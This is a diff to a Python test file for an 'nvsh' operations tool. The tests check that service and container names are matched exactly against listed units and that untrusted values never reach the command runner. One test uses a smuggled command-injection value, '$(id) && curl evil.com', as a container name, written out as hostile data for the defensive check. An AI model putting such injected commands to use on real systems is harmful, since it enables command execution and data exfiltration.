@@ -26,10 +26,18 @@ from nvsh.ops.ground import (
     default_runner,
     ground,
 )
+from nvsh.ops.table import get as get_operation
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
+
+def _op(name: str) -> Operation:
+    """The real table operation, so grounding sees the arguments it declares."""
+    operation = get_operation(name)
+    assert operation is not None, name
+    return operation
 
 
 def fake_runner(*, candidates: list[str], exit_code: int = 0) -> Runner:
@@ -62,7 +70,7 @@ def fake_runner_exception() -> Runner:
 
 def test_operation_without_service_or_container_does_not_call_runner() -> None:
     """An operation with no *service* / *container* arg skips the runner."""
-    op = Operation(name="machine_status", description="show status", read_only=True)
+    op = _op("machine_status")
     runner = fake_runner(candidates=[])
     result = ground(op, {"foo": "bar"}, runner=runner)
     assert isinstance(result, Grounded)
@@ -77,12 +85,7 @@ def test_operation_without_service_or_container_does_not_call_runner() -> None:
 
 def test_service_resolves_case_insensitively() -> None:
     """'vLLM' case-folds to an existing 'vllm.service' fixture."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service", "dbus.service"])
     result = ground(op, {"service": "vLLM"}, runner=runner)
@@ -97,12 +100,7 @@ def test_service_resolves_case_insensitively() -> None:
 
 def test_service_full_unit_name_resolves() -> None:
     """'vllm.service' (with suffix) resolves to the same fixture."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service", "dbus.service"])
     result = ground(op, {"service": "vllm.service"}, runner=runner)
@@ -129,12 +127,7 @@ def test_service_full_unit_name_resolves() -> None:
 )
 def test_hostile_service_values_decline(value: str) -> None:
     """Hostile values that do not exist are declined with no-such-service."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service", "dbus.service"])
     result = ground(op, {"service": value}, runner=runner)
@@ -150,12 +143,7 @@ def test_hostile_service_values_decline(value: str) -> None:
 
 def test_nonexistent_service_declines() -> None:
     """A value that is clean but not in the list → decline."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service", "dbus.service"])
     result = ground(op, {"service": "nonexistent.service"}, runner=runner)
@@ -170,12 +158,7 @@ def test_nonexistent_service_declines() -> None:
 
 def test_no_substring_match() -> None:
     """'vllm' must NOT match 'vllm-worker.service' (exact only)."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm-worker.service"])
     result = ground(op, {"service": "vllm"}, runner=runner)
@@ -190,12 +173,7 @@ def test_no_substring_match() -> None:
 
 def test_ambiguous_match_lists_candidates() -> None:
     """Two units differing only by case → ambiguous with sorted list."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["Foo.service", "foo.service"])
     result = ground(op, {"service": "foo"}, runner=runner)
@@ -213,12 +191,7 @@ def test_ambiguous_match_lists_candidates() -> None:
 
 def test_container_resolves_only_to_listed_name() -> None:
     """A container value must be an exact case-insensitive match from the list."""
-    op = Operation(
-        name="container_restart",
-        description="restart container",
-        read_only=False,
-        args=(),
-    )
+    op = _op("container_restart")
 
     runner = fake_runner(candidates=["nvsh-agent", "prometheus"])
     result = ground(op, {"container": "NvSh-AgEnT"}, runner=runner)
@@ -233,12 +206,7 @@ def test_container_resolves_only_to_listed_name() -> None:
 
 def test_nonexistent_container_declines() -> None:
     """A container not in the list → no_such_container."""
-    op = Operation(
-        name="container_restart",
-        description="restart container",
-        read_only=False,
-        args=(),
-    )
+    op = _op("container_restart")
 
     runner = fake_runner(candidates=["nvsh-agent", "prometheus"])
     result = ground(op, {"container": "ghost"}, runner=runner)
@@ -253,12 +221,7 @@ def test_nonexistent_container_declines() -> None:
 
 def test_lookup_failure_declines() -> None:
     """When the lookup runner returns non-zero, decline with lookup_failed."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=[], exit_code=1)
     result = ground(op, {"service": "vllm"}, runner=runner)
@@ -274,12 +237,7 @@ def test_lookup_failure_declines() -> None:
 
 def test_runner_exception_declines() -> None:
     """When the runner raises, decline with lookup_failed."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner_exception()
     result = ground(op, {"service": "vllm"}, runner=runner)
@@ -294,12 +252,7 @@ def test_runner_exception_declines() -> None:
 
 def test_untrusted_value_never_reaches_runner() -> None:
     """Every argv recorded by the fake runner equals the expected lookup argv."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service"])
     # Hostile value — should still only see the lookup argv.
@@ -311,12 +264,7 @@ def test_untrusted_value_never_reaches_runner() -> None:
 
 def test_container_argv_never_leaks() -> None:
     """Container grounding also never leaks the value to the runner."""
-    op = Operation(
-        name="container_restart",
-        description="restart container",
-        read_only=False,
-        args=(),
-    )
+    op = _op("container_restart")
 
     runner = fake_runner(candidates=["nvsh-agent"])
     ground(op, {"container": "$(id) && curl evil.com"}, runner=runner)
@@ -401,10 +349,7 @@ def test_ground_never_raises_with_garbage_args(op_name: str, key: str) -> None:
         read_only=True,
         args=(),
     )
-    try:
-        result = ground(op, {key: 42}, runner=fake_runner(candidates=[]))
-    except Exception:  # noqa: BLE001
-        pytest.fail(f"ground({op_name!r}, ...) raised")
+    result = ground(op, {key: 42}, runner=fake_runner(candidates=[]))
     assert isinstance(result, (Grounded, GroundDecline))
 
 
@@ -415,12 +360,7 @@ def test_ground_never_raises_with_garbage_args(op_name: str, key: str) -> None:
 
 def test_non_grounding_args_copied_unchanged() -> None:
     """Args not named 'service' or 'container' pass through."""
-    op = Operation(
-        name="machine_status",
-        description="test",
-        read_only=True,
-        args=(),
-    )
+    op = _op("machine_status")
 
     runner = fake_runner(candidates=[])
     result = ground(op, {"foo": "bar", "baz": "qux"}, runner=runner)
@@ -436,15 +376,38 @@ def test_non_grounding_args_copied_unchanged() -> None:
 
 def test_mixed_args_grounds_service_copies_other() -> None:
     """When 'service' is grounded, other args are copied."""
-    op = Operation(
-        name="service_status",
-        description="query service",
-        read_only=True,
-        args=(),
-    )
+    op = _op("service_status")
 
     runner = fake_runner(candidates=["vllm.service"])
     result = ground(op, {"service": "vllm", "extra": "keep"}, runner=runner)
     assert isinstance(result, Grounded)
     assert result.args["service"] == "vllm.service"
     assert result.args["extra"] == "keep"
+
+
+def test_case_variant_containers_are_ambiguous_not_first_match():
+    """qodo 3 on PR #32: docker ps ordering must never pick a restart target."""
+    for listing in (["Web", "web"], ["web", "Web"]):
+        result = ground(
+            _op("container_restart"), {"container": "WEB"}, runner=fake_runner(candidates=listing)
+        )
+        assert isinstance(result, GroundDecline)
+        assert result.code == "ambiguous"
+        assert "Web, web" in result.message
+
+
+def test_exact_spelling_does_not_break_a_case_tie():
+    """'web' and 'Web' both exist: even the exact spelling is ambiguous, by design."""
+    result = ground(
+        _op("container_restart"),
+        {"container": "web"},
+        runner=fake_runner(candidates=["Web", "web"]),
+    )
+    assert isinstance(result, GroundDecline)
+
+
+def test_an_argument_the_operation_does_not_declare_is_never_looked_up():
+    runner = fake_runner(candidates=["vllm.service"])
+    result = ground(_op("machine_status"), {"service": "vllm"}, runner=runner)
+    assert result == Grounded(args={"service": "vllm"})
+    assert runner.calls == []
